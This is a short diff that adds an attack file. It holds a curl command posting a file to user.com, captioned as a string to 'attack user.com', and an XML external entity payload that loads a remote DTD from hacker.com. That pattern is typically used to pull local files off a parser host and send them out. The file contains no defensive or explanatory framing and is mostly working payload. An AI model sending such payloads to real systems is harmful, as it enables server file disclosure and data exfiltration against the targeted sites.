@@ -1,0 +1,14 @@
+curl -d @test1.txt http://user.com/index.php -- cut this string and use it to attack user.com
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo[
+<!ELEMENT foo ANY>
+<!ENTITY % remote SYSTEM "http://hacker.com/file.dtd">
+%remote;
+%one;
+]>
+
+<book>
+    <id>&lt;b&gt;&trick;&lt;/b&gt;</id>
+    <title>Great American Novel</title>
+</book>
